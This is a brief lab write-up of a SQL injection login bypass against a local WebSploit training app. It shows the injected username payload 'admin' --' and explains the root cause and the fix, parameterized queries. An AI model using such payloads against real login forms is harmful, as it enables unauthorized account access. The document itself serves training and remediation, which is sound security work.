kk# SQL Injection — WebSploit `sqli-breach`

## Target

http://127.0.0.1:5001

## Vulnerability

SQL Injection / Authentication Bypass

## Normal Request

POST /

username=test
password=test

Result:
Invalid credentials

## Test Payload

username=admin' -- 
password=anything

## Result

The application authenticates as the `admin` user without knowing the
administrator password.

## Root Cause

The application constructs the SQL statement by concatenating user input
directly into the SQL query instead of using parameterized queries.

## Impact

An attacker can potentially alter the intended SQL statement and bypass
authentication.

## Remediation

Use parameterized queries / prepared statements and never concatenate
untrusted input directly into SQL statements.

## Scope

127.0.0.1:5001 — local WebSploit training environment.
